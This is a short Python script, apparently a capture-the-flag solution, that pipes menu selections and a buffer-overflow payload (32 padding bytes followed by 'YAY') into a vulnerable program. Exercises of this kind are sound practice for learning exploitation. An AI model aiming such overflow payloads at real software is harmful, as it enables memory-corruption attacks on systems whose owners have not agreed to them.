
from sys import stdout

def send(payload):
  stdout.buffer.write(payload)


payload = b'A' * 32 + b'YAY'

send(b"2\n")
send(payload + b"\n")
send(b"1\n")
send(b"3\n")
send(b"4\n")

